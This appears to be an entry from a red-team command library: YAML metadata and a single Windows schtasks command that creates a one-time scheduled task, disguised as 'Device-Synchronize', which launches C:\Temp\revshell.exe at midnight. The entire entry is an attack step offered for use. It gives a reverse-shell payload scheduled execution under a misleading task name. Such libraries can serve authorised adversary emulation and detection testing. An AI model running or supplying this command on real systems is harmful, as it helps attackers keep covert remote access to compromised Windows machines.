---
id: f7bd5eaa-66ed-4f37-bf35-2b59d4510bcc
name: Create scheduled task to run revshell.exe at 00:00
type: command
executor: bash
data: schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
output: null
created_at: '2023-04-06T03:56:27.837176+00:00'
updated_at: '2023-04-10T20:37:30.438026+00:00'
---

# Create scheduled task to run revshell.exe at 00:00

```bash
schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
```
